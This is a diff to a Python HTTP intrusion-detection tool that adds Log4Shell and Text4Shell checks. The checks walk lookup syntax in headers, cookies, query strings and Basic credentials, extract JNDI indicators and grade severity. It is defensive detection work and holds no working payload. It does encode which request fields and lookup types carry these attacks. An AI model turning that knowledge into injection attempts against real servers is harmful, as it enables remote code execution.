+    out: List[Tuple[str, bytes]] = []
+
+    def add(label: str, value: Optional[bytes]) -> None:
+        if not value or len(out) >= LOOKUP_MAX_CARRIERS:
+            return
+        if LOOKUP_OPEN not in value:
+            return          # the cheap gate, applied before anything else
+        out.append((label, value[:LOOKUP_CARRIER_CAP]))
+
+    for name, value in msg.headers:
+        low = name.lower()
+        if low == b"cookie":
+            # the whole header, then each cookie value, raw and decoded
+            add("header:cookie", value)
+            for cname, cval in parse_cookie(value):
+                tag = "cookie:" + cname.decode("latin-1")[:48]
+                add(tag, cval)
+                dec = urldecode(cval)
+                if dec != cval:
+                    add(tag + ":decoded", dec)
+            continue
+        if low == b"authorization":
+            continue        # handled below, and never logged
+        add("header:" + low.decode("latin-1")[:48], value.strip(b" \t"))
+
+    target = msg.target or b""
+    if target:
+        add("target_raw", target)
+        q = target.find(b"?")
+        path = target[:q] if q >= 0 else target
+        dec_path = urldecode(path)
+        if dec_path != path:
+            add("path_decoded", dec_path)
+        if q >= 0:
+            for pair in re.split(rb"[&;]", target[q + 1:]):
+                if not pair:
+                    continue
+                eq = pair.find(b"=")
+                pname = urldecode(pair[:eq] if eq >= 0 else pair)
+                tag = "query:" + pname.decode("latin-1")[:48]
+                if eq >= 0:
+                    add(tag, urldecode(pair[eq + 1:]))
+                else:
+                    add(tag, pname)
+
+    # Basic credentials are scanned and never logged: the carrier label
+    # says only that it was the credentials, and the payload knob cannot
+    # widen to them.
+    auth = msg.get(b"authorization")
+    if auth and auth[:6].lower() == b"basic ":
+        try:
+            raw = base64.b64decode(auth[6:].strip(), validate=False)
+        except (ValueError, binascii.Error):
+            raw = b""
+        if raw and LOOKUP_OPEN in raw:
+            out.append(("basic_credentials", raw[:LOOKUP_CARRIER_CAP]))
+    return out
+
+
+def _jndi_ioc(target: str) -> Dict[str, Any]:
+    """Pull the scheme and host:port out of a JNDI target, as an IOC."""
+    scheme = None
+    host = None
+    i = target.find("://")
+    if i > 0:
+        scheme = target[:i].lower()[:16]
+        rest = target[i + 3:]
+        cut = len(rest)
+        for ch in "/?#":
+            k = rest.find(ch)
+            if 0 <= k < cut:
+                cut = k
+        host = rest[:cut][:120] or None
+    elif ":" in target:
+        scheme = target.split(":", 1)[0].lower()[:16]
+    return {"scheme": scheme, "endpoint": host}
+
+
+def _lookup_findings(code: str, prof: LookupProfile, carrier: str,
+                     value: bytes, walk: LookupWalk,
+                     cfg: WatchConfig, flow_id: Optional[str]
+                     ) -> List[Finding]:
+    low = value.lower()
+    literal = any((b"${" + d) in low for d in prof.dangerous)
+    out: List[Finding] = []
+    for hit in walk.hits:
+        ev: Dict[str, Any] = {
+            "attack": "Log4Shell" if prof.name == "log4j" else "Text4Shell",
+            "profile": prof.name,
+            "carrier": carrier,
+            "lookup": hit["lookup"],
+            "obfuscated": not literal,
+            "features": sorted(walk.features),
+            "lookups_seen": sorted(walk.lookups_seen),
+            "target_opaque": hit["target_opaque"],
+            "nested_in_argument": hit["nested_in_argument"],
+            "carrier_length": len(value),
+            "carrier_digest": redact(value),
+            "walker_budget_exceeded": walk.budget_exceeded,
+            "walker_expansions": walk.expansions,
+        }
+        if prof.name == "log4j":
+            ev.update(_jndi_ioc(hit["target"]))
+            ev["severity_class"] = "high" if ev.get("scheme") == "dns" \
+                else "critical"
+        else:
+            ev["decoder_layers"] = ">".join(walk.decoder_chain) or None
+            ev["severity_class"] = {"script": "critical", "url": "high",
+                                    "dns": "medium"}[hit["lookup"]]
+            if hit["lookup"] == "url":
+                ev.update(_jndi_ioc(hit["target"]))
+            elif hit["lookup"] == "script":
+                # the engine name only; a script body is never logged
+                eng = hit["target"].split(":", 1)[0]
+                ev["script_engine"] = eng[:32] or None
+            else:
+                ev["dns_query"] = hit["target"][:120]
+        ev["note"] = (
+            "A dangerous lookup was delivered in a field these libraries "
+            "commonly interpolate. The obfuscation is the library's own "
+            "lookup grammar, so this is walked rather than string-matched, "
+            "and the walker is held against the real engine over a 24,000-"
+            "case differential corpus. Whether THIS server logs or "
+            "interpolates this field with a vulnerable library is not "
+            "visible, so the finding is a delivery attempt and nothing "
+            "more. No payload content is matched or logged: not the JNDI "
+            "target's contents, not a script body, not a fetched URL. "
+            "Log4Shell scanning has run continuously for years, so an "
+            "internet-facing tap will ring on background noise.")
+        # the carrier text only on the operator's explicit say-so, and
+        # never for Basic credentials whatever the knob says
+        if cfg.log_attack_payload and carrier != "basic_credentials":
+            ev["payload"] = value.decode("latin-1", "replace")[:512]
+        out.append(make_finding(code, ev, flow=flow_id))
+    return out
+
+
+def check_lookup_grammar_fields(carriers: Sequence[Tuple[str, bytes]],
+                                cfg: WatchConfig = WATCH_DEFAULTS,
+                                stats: Optional[Dict[str, int]] = None,
+                                flow_id: Optional[str] = None
+                                ) -> List[Finding]:
+    """HTTP-091 and HTTP-092 over already-extracted carriers."""
+    out: List[Finding] = []
+    for carrier, value in carriers:
+        for code, prof in (("HTTP-091", LOG4J_PROFILE),
+                           ("HTTP-092", CTEXT_PROFILE)):
+            walk = walk_lookups(value, prof)
+            if walk.budget_exceeded and stats is not None:
+                stats["walker_budget_exceeded"] = (
+                    stats.get("walker_budget_exceeded", 0) + 1)
+            if not walk.hits:
+                continue
+            out.extend(_lookup_findings(code, prof, carrier, value, walk,
+                                        cfg, flow_id))
+    return out
+
+
+def check_lookup_grammar(msg: ParsedMessage,
+                         cfg: WatchConfig = WATCH_DEFAULTS,
+                         stats: Optional[Dict[str, int]] = None
+                         ) -> List[Finding]:
+    """HTTP-091 and HTTP-092 over an HTTP/1.x request."""
+    return check_lookup_grammar_fields(lookup_carriers(msg), cfg, stats)
+
+
 # ---------------------------------------------------------------------------
 # Tier G: content-coding validation
 # ---------------------------------------------------------------------------
@@ -4216,6 +5105,7 @@ def analyse_http1_message(msg: ParsedMessage, raw: bytes,
         findings.extend(check_java4shell(msg))
         findings.extend(check_struts_s2045(msg, cfg))
         findings.extend(check_exchange_proxylogon(msg, cfg))
+        findings.extend(check_lookup_grammar(msg, cfg, stats))
         # --- Tier F ---
         # The decoded body is built once and shared: dechunking a 23 MB
         # body twice would be the kind of cost that gets a rule disabled.
@@ -4226,6 +5116,11 @@ def analyse_http1_message(msg: ParsedMessage, raw: bytes,
         findings.extend(check_struts_s2046(msg, decoded, body_info, cfg))
         findings.extend(check_exchange_proxyshell(msg, decoded, cfg))
         findings.extend(check_sharepoint_toolshell(msg, decoded, cfg, stats))
+        php_ctype, php_cparams = parse_content_type(msg.get(b"content-type"))
+        if php_ctype == b"multipart/form-data":
+            php_parts, _ = parse_multipart(
+                decoded, php_cparams.get(b"boundary", b""))
+            findings.extend(check_php_aftershell(msg, php_parts, cfg, stats))
         # --- Tier G ---
         findings.extend(check_brotli(msg, decoded, body_info, cfg.brotli,
                                      stats))
@@ -4482,6 +5377,46 @@ class H2ConnectionState:
             findings.extend(check_sharepoint_toolshell_fields(
                 path, hmap.get(b"referer"), method, b"", body_visible=False,
                 cfg=self.cfg, stats=None, flow_id=self.flow_id))
+            # The lookup walker reads only headers and the request target,
+            # so h2c costs nothing. HTTP-089 is not here: it needs the
+            # multipart body, and DATA frames reach no body sink, which the
+            # README states as a gap.
+            h2_carriers: List[Tuple[str, bytes]] = []
+            for hn, hv in headers:
+                hl = hn.lower()
+                if hl == b":path":
+                    continue
+                if hl == b"cookie":
+                    if LOOKUP_OPEN in hv:
+                        h2_carriers.append(("header:cookie", hv))
+                    for cn, cv in parse_cookie(hv):
+                        if LOOKUP_OPEN in cv:
+                            h2_carriers.append(
+                                ("cookie:" + cn.decode("latin-1")[:48], cv))
+                    continue
+                if hl == b"authorization":
+                    continue
+                if LOOKUP_OPEN in hv:
+                    h2_carriers.append(
+                        ("header:" + hl.decode("latin-1")[:48],
+                         hv.strip(b" \t")))
+            if LOOKUP_OPEN in path:
+                h2_carriers.append(("target_raw", path))
+                q = path.find(b"?")
+                if q >= 0:
+                    for pair in re.split(rb"[&;]", path[q + 1:]):
+                        if not pair:
+                            continue
+                        eq = pair.find(b"=")
+                        pn = urldecode(pair[:eq] if eq >= 0 else pair)
+                        pv = urldecode(pair[eq + 1:]) if eq >= 0 else pn
+                        if LOOKUP_OPEN in pv:
+                            h2_carriers.append(
+                                ("query:" + pn.decode("latin-1")[:48], pv))
+            if h2_carriers:
+                findings.extend(check_lookup_grammar_fields(
+                    h2_carriers, cfg=self.cfg, stats=self.cfg and None,
+                    flow_id=self.flow_id))
 
         if from_client and self._once("h2c_posture"):
             findings.append(make_finding("HTTP-060", {
@@ -4721,6 +5656,8 @@ class HttpWatch:
             "leaks_suppressed": 0, "tierf_inspect_truncated": 0,
             "attacks_suppressed": 0,
             "toolshell_signout_nonallowlisted": 0,
+            "php_scalar_record_shape": 0,
+            "walker_budget_exceeded": 0,
         }
 
     # -- lifecycle --------------------------------------------------------
